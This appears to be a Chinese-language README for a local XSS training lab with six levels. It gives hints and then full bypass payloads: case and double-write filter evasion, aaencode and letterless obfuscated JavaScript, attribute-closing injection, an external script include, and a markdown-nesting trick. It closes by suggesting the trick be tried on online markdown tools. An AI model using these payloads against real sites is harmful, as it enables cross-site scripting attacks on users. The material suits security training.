# 易锦 XSS 靶场

> 一个有意思的 XSS bypass 练习靶场，使用 React + Typescript 开发。



# 运行

1. 下载靶场源码，或者克隆到本地

2. 安装依赖

   ```bash
   npm  install
   ```

3. 运行靶场

   ```bash
   npm  start
   ```

4. 访问靶场

   默认是在[127.0.0.1:3000](127.0.0.1:3000)

5. 靶场使用

   在输入框中输入的内容经过 `parse` 函数处理之后渲染到一个 iframe 页面，这个页面里的 `alert` 函数已经被重写，调用 `alert` 之后就可以通关，通关后上方的关卡标题右边会出现”下一关“的按钮。

   







# 霉霉镇楼，不要偷看答案哦！

![](http://n.sinaimg.cn/ent/transform/20170506/zJy9-fyeyqek9981336.jpg)



















# 通关思路（无 payload）

先试试根据下面的提示进行尝试，试不出来再去看带 payload 的详解版本。

1. 第一关

   这一关是 XSS 入门，只要会前端的人都会，就不说了。

2. 第二关

   针对常见的引用资源的标签名做了过滤，不过只替换小写，因此可以大写绕过。

3. 第三关

   补上了大小写匹配，但是采用粗暴的替换方式，可以使用双写绕过。

4. 第四关

   使用了神挡杀神佛挡杀佛的全大写，HTML 平安无恙，但是 JS 就无法执行了。但是 JS 的某些 Bug 是可以当作 Feature 来尝试的。

   没有头绪吗？搜索 aaencode 试试。

5. 第五关

   这一关属于是返璞归真了， XSS 漏洞很多时候是从属性带入的，只要会构造闭合就行了。

6. 第六关

   这一关可能确实有点难，不过仔细观察一下，图片和链接语法是先后解析的——这意味着如果把两个语句“套娃”的话，可能会产生奇效。











# 锦鲤提示：不要偷看答案哦！

![](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fn.sinaimg.cn%2Fent%2Ftransform%2F373%2Fw440h733%2F20200315%2Fa895-iquxrui6507919.jpg&refer=http%3A%2F%2Fn.sinaimg.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1670418517&t=ceb307d6cdbf247168485e170673708b)









# 答案仅供参考（带 payload ）

1. 第一关，简单、原始、暴力

   ```html
   <script>alert()</script>
   ```

2. 第二关

   > 几个能带入脚本的标签会被替换掉，但是没考虑大写，所以果断大小写绕过，当然这里也可以使用双写。

   ```html
   <SCRipt>alert('Hello world')</script>
   ```

3. 第三关

   > 这一关大小写都会被杀掉，所以首选双写绕过。

   ```html
   <i<imgmg src onerror=alert() />
   ```

   ```html
   <scr<scriptipt>alert('Hello world')</script>
   ```

   > 也可以使用点击事件通关。
   >
   > 当然，XSS 利用的第一原则：能自动触发的绝不考虑交互触发。

   ```html
   <a onclick="alert(1)">点我</a>
   ```

4. 第四关

   > 这一关它会把所有字母改成大写，*HTML* 还是可以带进去，但是 *JS* 带不进去了。
   >
   > 可以使用**不带字母**的方法通关（只有字母有大小写）。

   ```html
   <script>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~[表情][表情][表情]   //*´[表情]｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+/*´[表情]｀*/(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_'); </script>
   ```

   > 或者也可使用如下 *alert payload*：

   ```html
   <img src onerror="_ =[] + ![] + !![];__=[]+[][0];$_=[]+{};_1=$_[5]+$_[1]+__[1]+_[3]+$_[6]+_[6]+__[0]+$_[5]+$_[6]+$_[1]+_[6];_2=_[1]+_[2]+_[4]+_[6]+$_[6];(0)[_1][_1](_2+'(1)')()" />
   ```

   > 除了上面这种奇怪的编码之外，还可以使用跨站脚本。
   >
   > 先把一个内容为`alert()`、名为 `ALERT.JS` 的脚本放到网站上：

   ```html
   <script src="//xxxx.xxxx.xxx/ALERT.JS"></script>
   ```

5. 第五关

   > 构造 **HTML** 属性闭合(使用引号闭合)。

   ```html
   " onerror="alert()
   ```

6. 第六关

   > markdown **图片**语法:
   >
   > ```markdown
   > ![图片的描述](图片的链接)
   > ```
   >
   > markdown **链接**语法：
   >
   > ```markdown
   > [链接的描述](链接的地址)
   > ```
   >
   > 有语法解析的地方，写点奇怪的东西，看能不能弄出解析结果错误。
   >
   > “*图片语法里面套娃套一个*链接语法”，造成 HTML 结构破坏，后面就可以 `onerror` 了，结合 `setTimeout` 特殊用法，绕开括号限制，拿下！
   >
   > ```markdown
   > ![[1](onerror=setTimeout`alert\x28\x29` )]()
   > ```

   > #### 题解思路
   >
   > `Markdown` 产出的内容**通常被直接渲染到网页上**，而不会经过框架的反 *XSS* 过滤，框架对此无能为力了。
   >
   > 1. 通过查看代码，我们发现对方把单双引号跟小于符号都过滤掉了
   >
   >    ![image-20220505222836959](C:\Users\ligr\AppData\Roaming\Typora\typora-user-images\image-20220505222836959.png)
   >
   >    所以常规的闭合思路不可取。
   >
   > 2. 但是，渲染标签的时候，对方给我们引入了梦寐以求的双引号
   >
   >    ```
   >    [1](2)
   >    ```
   >
   >    ![image-20220505223014862](C:\Users\ligr\AppData\Roaming\Typora\typora-user-images\image-20220505223014862.png)
   >
   > 3. 因此猜想把链接语法跟图片语法结合使用会有惊喜
   >
   >    ```
   >    ![[1](2)]()
   >    ```
   >
   >    ![image-20220505223418266](C:\Users\ligr\AppData\Roaming\Typora\typora-user-images\image-20220505223418266.png)
   >
   > 4. 尝试使用常规 payload，但是只有第一个括号，第二个被无意间干掉了，这是因为编辑器的语法解析的时候也需要圆括号，这个圆括号造成了干扰。
   >
   >    ```markdown
   >    ![[1](onerror=alert(1) )]()
   >    ```
   >
   >    ![image-20220505223835738](C:\Users\ligr\AppData\Roaming\Typora\typora-user-images\image-20220505223835738.png)
   >
   >    所以我们需要一种不引入圆括号的方法。
   >
   > 5. 结合 JS 的接口 `setTimeout` 可以**直接将后续的字符串变成代码**的奇葩特性，再加上十六进制编码`\x29 ==> )`，有突破口！
   >
   >    ```markdown
   >    ![[1](onerror=setTimeout`alert\x28\x29` )]()
   >    ```
   >
   > 
   >
   >    ![image-20220505224141164](C:\Users\ligr\AppData\Roaming\Typora\typora-user-images\image-20220505224141164.png)
   >
   > 

   另外一种 针对 markdown 的 payload （仅针对对方没有过滤双引号的场景，不适用于这个靶场）：

   ```html
   ![]("onerror=setTimeout`alert\x28\x29`)
   ```

   > 以后遇到在线的 markdown 写作工具的时候可以试着挖掘一下。
